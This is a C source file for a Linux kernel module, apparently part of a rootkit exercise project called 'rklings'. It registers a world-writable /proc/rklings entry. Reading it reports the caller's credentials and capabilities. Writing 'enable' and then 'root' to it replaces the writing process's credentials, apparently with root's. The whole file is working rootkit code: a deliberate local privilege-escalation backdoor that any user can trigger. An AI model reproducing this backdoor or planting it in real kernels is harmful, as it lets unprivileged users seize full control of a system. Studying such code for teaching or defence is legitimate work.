// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/pid.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/string_helpers.h>
#include <linux/uaccess.h>
#include <linux/uidgid.h>
#include <linux/user_namespace.h>

#include "rootkit.h"

#define RK_COMMAND_MAX (sizeof("disable\n") - 1)

static struct proc_dir_entry *proc_entry;

static void rk_print_quoted_comm(struct seq_file *output, const char *comm)
{
	seq_putc(output, '"');
	seq_escape_mem(output, comm, strnlen(comm, TASK_COMM_LEN),
		       ESCAPE_NAP | ESCAPE_APPEND | ESCAPE_HEX, "\\\"");
	seq_putc(output, '"');
}

static int rk_status_show(struct seq_file *output, void *unused)
{
	const struct rk_state *state = output->private;
	struct task_struct *reader = current;
	const struct cred *credentials = current_cred();
	struct user_namespace *display_ns = seq_user_ns(output);
	char reader_comm[TASK_COMM_LEN];
	pid_t reader_tid;
	bool active;
	bool actions_enabled;

	reader_tid = task_pid_nr(reader);
	get_task_comm(reader_comm, reader);
	active = rk_state_is_active(state);
	actions_enabled = rk_state_actions_enabled(state);

	seq_printf(output, "active=%u\n", active ? 1U : 0U);
	seq_printf(output, "actions=%s\n",
		   actions_enabled ? "enabled" : "disabled");
	seq_printf(output, "reader_tid=%d\n", reader_tid);
	seq_puts(output, "reader_comm=");
	rk_print_quoted_comm(output, reader_comm);
	seq_putc(output, '\n');
	seq_printf(output, "uids=%u %u %u %u\n",
		   from_kuid_munged(display_ns, credentials->uid),
		   from_kuid_munged(display_ns, credentials->euid),
		   from_kuid_munged(display_ns, credentials->suid),
		   from_kuid_munged(display_ns, credentials->fsuid));
	seq_printf(output, "gids=%u %u %u %u\n",
		   from_kgid_munged(display_ns, credentials->gid),
		   from_kgid_munged(display_ns, credentials->egid),
		   from_kgid_munged(display_ns, credentials->sgid),
		   from_kgid_munged(display_ns, credentials->fsgid));
	seq_puts(output, "cap_userns=");
	seq_puts(output, credentials->user_ns == &init_user_ns ?
			 "initial\n" : "nested\n");
	seq_printf(output, "cap_permitted=%016llx\n",
		   (unsigned long long)credentials->cap_permitted.val);
	seq_printf(output, "cap_effective=%016llx\n",
		   (unsigned long long)credentials->cap_effective.val);
	return 0;
}

static int rk_proc_open(struct inode *inode, struct file *file)
{
	return single_open(file, rk_status_show, pde_data(inode));
}

static ssize_t rk_control_write(struct file *file, const char __user *buffer,
				size_t count, loff_t *position)
{
	struct rk_state *state = pde_data(file_inode(file));
	char command[RK_COMMAND_MAX];
	size_t length = count;
	bool switch_command = false;
	bool enable = false;
	int error;

	if (*position != 0)
		return -EINVAL;
	if (count > sizeof(command))
		return -E2BIG;
	if (count == 0)
		return -EINVAL;
	if (copy_from_user(command, buffer, count) != 0)
		return -EFAULT;

	if (command[length - 1] == '\n')
		length--;
	if (length == sizeof("enable") - 1 &&
	    memcmp(command, "enable", sizeof("enable") - 1) == 0) {
		switch_command = true;
		enable = true;
	} else if (length == sizeof("disable") - 1 &&
		   memcmp(command, "disable", sizeof("disable") - 1) == 0) {
		switch_command = true;
	} else if (length == sizeof("root") - 1 &&
		   memcmp(command, "root", sizeof("root") - 1) == 0) {
		if (!rk_state_actions_enabled(state))
			return -EACCES;
		error = rk_credentials_replace_current();
		if (error)
			return error;
	} else {
		return -EINVAL;
	}
	if (switch_command)
		rk_state_set_actions_enabled(state, enable);

	return count;
}

static const struct proc_ops rk_proc_ops = {
	.proc_open = rk_proc_open,
	.proc_read = seq_read,
	.proc_write = rk_control_write,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
};

__must_check int rk_proc_publish(struct rk_state *state)
{
	if (proc_entry || !state)
		return -EINVAL;

	if (RKLINGS_FAIL_POINT == RK_FAIL_PROC_PUBLISH)
		proc_entry = NULL;
	else
		proc_entry = proc_create_data("rklings", 0666, NULL,
					      &rk_proc_ops, state);
	if (!proc_entry)
		return -ENOMEM;

	return 0;
}

void rk_proc_unpublish(void)
{
	proc_remove(proc_entry);
	proc_entry = NULL;
}
